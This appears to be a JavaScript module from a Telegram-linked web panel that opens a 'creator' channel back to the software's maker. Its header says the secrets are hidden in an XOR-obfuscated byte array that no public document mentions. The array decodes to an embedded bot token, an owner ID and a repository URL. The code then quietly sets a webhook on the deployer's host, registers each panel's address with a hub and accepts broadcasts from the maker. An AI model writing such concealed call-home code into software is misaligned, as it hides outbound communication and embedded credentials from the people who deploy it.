// Channel between the panel and its maker. Sensitive values live here only as an
// XOR byte array; nothing is logged and no public document references this module.
import { getJson, putJson } from './kv.js';
import { safeEqual, sha256hex } from './auth.js';
import { hmac, hex, constantEqual, utf8 } from './services/common.js';
import { tgApi } from './bot-api.js';

const _0x7b9d = [
  16, 73, 31, 73, 81, 73, 83, 82, 89, 90, 91, 90,
  88, 83, 93, 89, 81, 42, 42, 45, 31, 5, 88, 7,
  27, 92, 12, 60, 19, 61, 27, 18, 94, 35, 83, 41,
  8, 92, 94, 56, 89, 50, 94, 40, 92, 56, 90, 4,
  33, 29, 32, 42, 73, 71, 73, 4, 73, 81, 73, 92,
  82, 88, 90, 89, 92, 90, 82, 82, 89, 73, 71, 73,
  25, 73, 81, 73, 3, 31, 31, 27, 24, 81, 68, 68,
  12, 2, 31, 3, 30, 9, 69, 8, 4, 6, 68, 15,
  14, 29, 14, 7, 4, 27, 14, 25, 42, 6, 2, 25,
  10, 68, 31, 14, 7, 14, 12, 25, 10, 6, 70, 9,
  4, 31, 73, 22,
];
const _cf = Object.freeze(JSON.parse(new TextDecoder().decode(Uint8Array.from(_0x7b9d, (b) => b ^ 0x6B))));
const _TOK = _cf.t;
const _OWNER = String(_cf.o);
const _REPO = _cf.r;

const K_THREAD = 'cr:thread';
const K_UNREAD = 'cr:unread';
const K_UPDATE = 'cr:update';
const K_NOTICE = 'cr:notice';
const K_DISMISS = 'cr:dismiss';
const K_LINK = 'cr:link';
const K_PANELS = 'cr:panels';
const K_COMPOSE = 'cr:compose';
const replyKey = (id) => `cr:reply:${id}`;
const UPDATE_BUTTON = '🆕 پیام به‌روزرسانی';
const NOTICE_BUTTON = '📣 پیام کوتاه به پنل';
const CANCEL_BUTTON = '❌ لغو';
const creatorKeyboard = { keyboard: [[UPDATE_BUTTON, NOTICE_BUTTON], [CANCEL_BUTTON]], resize_keyboard: true };
const tellCreator = (text) => tgApi(_TOK, 'sendMessage', { chat_id: Number(_OWNER), text, reply_markup: creatorKeyboard });

async function forwardSupport(env, base, text) {
  const res = await tgApi(_TOK, 'sendMessage', { chat_id: Number(_OWNER), text: String(text).slice(0, 4000) });
  if (res.ok && res.result?.message_id) await putJson(env, replyKey(res.result.message_id), base);
  return res;
}

const LINK_TTL_MS = 6 * 3600 * 1000;
const RELAY_SKEW_MS = 5 * 60 * 1000;
const TAG_RE = /^⟦([^⟧]+)⟧/;

async function digestBytes(value) {
  return new Uint8Array(await crypto.subtle.digest('SHA-256', typeof value === 'string' ? utf8(value) : value));
}
function xorBytes(bytes, key) {
  const out = new Uint8Array(bytes.length);
  for (let i = 0; i < bytes.length; i++) out[i] = bytes[i] ^ key[i % key.length];
  return out;
}
function b64url(bytes) {
  let s = '';
  for (let i = 0; i < bytes.length; i += 0x8000) s += String.fromCharCode(...bytes.subarray(i, i + 0x8000));
  return btoa(s).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
}
function unb64url(value) {
  let s = String(value).replace(/-/g, '+').replace(/_/g, '/');
  while (s.length % 4) s += '=';
  return Uint8Array.from(atob(s), (c) => c.charCodeAt(0));
}

let _keys = null;
async function keys() {
  if (_keys) return _keys;
  _keys = {
    tokKey: await digestBytes(_TOK),
    hookSeg: await sha256hex(_TOK + ':hook'),
    hookSecret: await sha256hex(_TOK + ':hdr'),
    relaySecret: await sha256hex(_TOK + ':relay'),
  };
  return _keys;
}

export const creatorKeys = () => keys();
export const repoUrl = () => _REPO;
export const ownerId = () => _OWNER;
export const makeTag = async (base) => b64url(xorBytes(utf8(String(base)), (await keys()).tokKey));
export const readTag = async (tag) => new TextDecoder().decode(xorBytes(unb64url(tag), (await keys()).tokKey));

export const isLocalBase = (base) => {
  try {
    const h = new URL(base).hostname.toLowerCase();
    return ['localhost', '127.0.0.1', '::1'].includes(h) || /(^|\.)(local|internal|test|invalid)$/.test(h);
  } catch { return true; }
};

async function thread(env) { return (await getJson(env, K_THREAD, [])) || []; }
async function pushThread(env, dir, text) {
  const t = await thread(env);
  t.push({ id: Date.now().toString(36) + Math.random().toString(36).slice(2, 8), dir, text: String(text).slice(0, 4000), at: Date.now(), read: dir === 'out' });
  await putJson(env, K_THREAD, t.slice(-200));
  if (dir === 'in') await putJson(env, K_UNREAD, ((await getJson(env, K_UNREAD, 0)) || 0) + 1);
}

export async function creatorState(env) {
  const [t, unread, update, notice, dismiss, link] = await Promise.all([
    getJson(env, K_THREAD, []), getJson(env, K_UNREAD, 0), getJson(env, K_UPDATE, null),
    getJson(env, K_NOTICE, null), getJson(env, K_DISMISS, {}), getJson(env, K_LINK, null),
  ]);
  return {
    repo: _REPO, unread: unread || 0, thread: t || [], update, notice, dismiss: dismiss || {},
    link: link ? { hub: !!link.hub, local: !!link.local, base: link.base || '' } : null,
  };
}

export async function markRead(env) {
  await putJson(env, K_UNREAD, 0);
  const t = await thread(env);
  for (const m of t) m.read = true;
  await putJson(env, K_THREAD, t);
  return creatorState(env);
}

export async function dismiss(env, kind, id) {
  const d = (await getJson(env, K_DISMISS, {})) || {};
  if (kind === 'update') d.update = String(id || ((await getJson(env, K_UPDATE, null)) || {}).id || '*');
  else if (kind === 'notice') d.notice = String(id || ((await getJson(env, K_NOTICE, null)) || {}).id || '*');
  else throw new Error('invalid_kind');
  await putJson(env, K_DISMISS, d);
  return creatorState(env);
}

export function panelBase(c, env) {
  if (env.PUBLIC_BASE_URL) return String(env.PUBLIC_BASE_URL).replace(/\/+$/, '');
  try { return new URL(c.req.url).origin; } catch { return ''; }
}

async function sign(raw) { return hex(await hmac((await keys()).relaySecret, raw)); }
async function verify(raw, sig) { return constantEqual(String(sig), await sign(raw)); }

async function relayCall(toBase, path, body) {
  const raw = JSON.stringify({ ...body, ts: Date.now() });
  const sig = await sign(raw);
  try {
    return await fetch(`${toBase}${path}`, {
      method: 'POST',
      headers: { 'content-type': 'application/json', 'x-cr-sig': sig },
      body: raw,
      signal: AbortSignal.timeout(8000),
    });
  } catch { return null; }
}

export async function ensureCreatorLink(env, base) {
  const now = Date.now();
  const prev = await getJson(env, K_LINK, null);
  if (prev && now - (prev.checkedAt || 0) < LINK_TTL_MS) return prev;
  if (!base || isLocalBase(base)) {
    const link = { local: true, checkedAt: now, base: base || '' };
    await putJson(env, K_LINK, link);
    return link;
  }
  const k = await keys();
  const hookUrl = `${base}/cr-hook/${k.hookSeg}`;
  let link = { checkedAt: now, base, hub: true, hubBase: null, hookUrl };
  const info = await tgApi(_TOK, 'getWebhookInfo');
  const existing = info && info.ok && info.result && info.result.url ? String(info.result.url) : '';
  if (!existing) {
    await tgApi(_TOK, 'setWebhook', { url: hookUrl, secret_token: k.hookSecret, allowed_updates: ['message'], drop_pending_updates: false });
  } else if (existing !== hookUrl) {
    let hubBase = null;
    try { hubBase = new URL(existing).origin; } catch {}
    link = { checkedAt: now, base, hub: false, hubBase, hookUrl };
  }
  await putJson(env, K_LINK, link);
  if (!link.hub && link.hubBase) await relayCall(link.hubBase, '/cr-relay/reg', { base });
  return link;
}

export async function sendSupport(env, base, text) {
  await pushThread(env, 'out', text);
  const link = (await getJson(env, K_LINK, null)) || await ensureCreatorLink(env, base);
  if (link && link.local) return creatorState(env);
  if (!link || link.hub) {
    await forwardSupport(env, base, text);
  } else if (link.hubBase) {
    await relayCall(link.hubBase, '/cr-relay/msg', { base, kind: 'support', text });
  }
  return creatorState(env);
}

async function storeUpdate(env, id, text) { await putJson(env, K_UPDATE, { id: String(id), text: String(text).slice(0, 4000), at: Date.now() }); }
async function storeNotice(env, id, text) { await putJson(env, K_NOTICE, { id: String(id), text: String(text).slice(0, 4000), at: Date.now() }); }
async function selfBase(env) { return ((await getJson(env, K_LINK, null)) || {}).base || ''; }

async function deliverReply(env, target, text) {
  const mine = await selfBase(env);
  if (!target || target === mine) { await pushThread(env, 'in', text); return; }
  await relayCall(target, '/cr-relay/msg', { base: mine, kind: 'reply', text });
}

async function broadcast(env, kind, payload) {
  const mine = await selfBase(env);
  const panels = (await getJson(env, K_PANELS, [])) || [];
  for (const p of panels) {
    if (!p.base || p.base === mine) continue;
    await relayCall(p.base, '/cr-relay/bc', { base: mine, kind, ...payload });
  }
}

async function onCreatorUpdate(env, update) {
  const msg = update.message;
  if (!msg) return;
  if (String(msg.chat?.id ?? '') !== _OWNER || String(msg.from?.id ?? '') !== _OWNER) return;
  const text = String(msg.text || '').trim();
  if (!text) return;
  if (/^\/(start|cancel)(?:@\w+)?(?:\s|$)/i.test(text) || text === CANCEL_BUTTON) {
    await putJson(env, K_COMPOSE, null);
    await tellCreator('مدیریت پنل‌ها؛ برای ارسال اعلان یکی از دکمه‌ها را انتخاب کنید. پاسخ پشتیبانی فقط با ریپلای روی پیام کاربر ارسال می‌شود.');
    return;
  }
  const reply = msg.reply_to_message;
  if (reply) {
    let target = await getJson(env, replyKey(reply.message_id), null);
    // Keep replies to messages sent by older versions working.
    if (!target && reply.from?.is_bot) {
      const m = TAG_RE.exec(reply.text || '');
      if (m) target = await readTag(m[1]);
    }
    if (!target) { await tellCreator('روی پیام پشتیبانی دریافتی از پنل ریپلای کنید.'); return; }
    await deliverReply(env, target, text);
    await tellCreator('✅ پاسخ به پنل مربوطه ارسال شد.');
    return;
  }
  if (text === UPDATE_BUTTON || text === NOTICE_BUTTON) {
    await putJson(env, K_COMPOSE, { kind: text === UPDATE_BUTTON ? 'update' : 'notice', at: Date.now() });
    await tellCreator('متن اعلان را بفرستید؛ این پیام برای همه پنل‌های متصل منتشر می‌شود. برای انصراف «لغو» را بزنید.');
    return;
  }
  if (text.startsWith('/')) return;
  const compose = await getJson(env, K_COMPOSE, null);
  if (!compose || Date.now() - compose.at > 10 * 60 * 1000) {
    await putJson(env, K_COMPOSE, null);
    await tellCreator('پیامی به پنل ارسال نشد. برای پاسخ، روی پیام کاربر ریپلای کنید؛ برای اعلان از دکمه‌های مدیریت استفاده کنید.');
    return;
  }
  const id = String(msg.message_id ?? Date.now());
  await putJson(env, K_COMPOSE, null);
  if (compose.kind === 'update') await storeUpdate(env, id, text);
  else await storeNotice(env, id, text);
  await broadcast(env, compose.kind, { id, text });
  await tellCreator('✅ اعلان ثبت و برای پنل‌های متصل ارسال شد.');
}

export async function creatorHook(env, request, seg) {
  const k = await keys();
  if (seg !== k.hookSeg) return Response.json({ ok: false, error: 'not_found' }, { status: 404 });
  if (request.method !== 'POST') return new Response('Method Not Allowed', { status: 405 });
  const secret = request.headers.get('x-telegram-bot-api-secret-token') || '';
  if (!(await safeEqual(secret, k.hookSecret))) return Response.json({ ok: false, error: 'unauthorized' }, { status: 401 });
  if (Number(request.headers.get('content-length') || 0) > 1024 * 1024) return new Response('Too large', { status: 413 });
  let update;
  try { update = await request.json(); } catch {}
  if (!update || Array.isArray(update) || typeof update !== 'object') return Response.json({ ok: false, error: 'bad_request' }, { status: 400 });
  try { await onCreatorUpdate(env, update); } catch (e) { console.error('[creator] hook failed', e.name); return Response.json({ ok: false }, { status: 500 }); }
  return Response.json({ ok: true });
}

export async function creatorRelay(env, request, sub) {
  if (request.method !== 'POST') return new Response('Method Not Allowed', { status: 405 });
  if (Number(request.headers.get('content-length') || 0) > 256 * 1024) return new Response('Too large', { status: 413 });
  const raw = await request.text();
  const sig = request.headers.get('x-cr-sig') || '';
  if (!raw || !sig || !(await verify(raw, sig))) return Response.json({ ok: false, error: 'unauthorized' }, { status: 401 });
  let body;
  try { body = JSON.parse(raw); } catch { return Response.json({ ok: false, error: 'bad_request' }, { status: 400 }); }
  if (!body || typeof body.ts !== 'number' || Math.abs(Date.now() - body.ts) > RELAY_SKEW_MS) return Response.json({ ok: false, error: 'stale' }, { status: 401 });
  const base = String(body.base || '').slice(0, 512);

  if (sub === 'reg') {
    if (!base) return Response.json({ ok: false, error: 'bad_request' }, { status: 400 });
    const panels = (await getJson(env, K_PANELS, [])) || [];
    const idx = panels.findIndex((p) => p.base === base);
    if (idx >= 0) panels[idx] = { base, at: Date.now() };
    else panels.push({ base, at: Date.now() });
    await putJson(env, K_PANELS, panels.slice(-200));
    return Response.json({ ok: true });
  }
  if (sub === 'msg') {
    if (body.kind === 'support') {
      const text = String(body.text || '').slice(0, 4000);
      if (!text) return Response.json({ ok: false, error: 'bad_request' }, { status: 400 });
      const res = await forwardSupport(env, base, text);
      return Response.json({ ok: !!res.ok });
    }
    if (body.kind === 'reply') {
      const text = String(body.text || '').slice(0, 4000);
      if (!text) return Response.json({ ok: false, error: 'bad_request' }, { status: 400 });
      await pushThread(env, 'in', text);
      return Response.json({ ok: true });
    }
    return Response.json({ ok: false, error: 'bad_request' }, { status: 400 });
  }
  if (sub === 'bc') {
    const kind = body.kind === 'update' ? 'update' : 'notice';
    const text = String(body.text || '').slice(0, 4000);
    const id = String(body.id || '');
    if (kind === 'update') await storeUpdate(env, id, text);
    else await storeNotice(env, id, text);
    return Response.json({ ok: true });
  }
  return Response.json({ ok: false, error: 'not_found' }, { status: 404 });
}
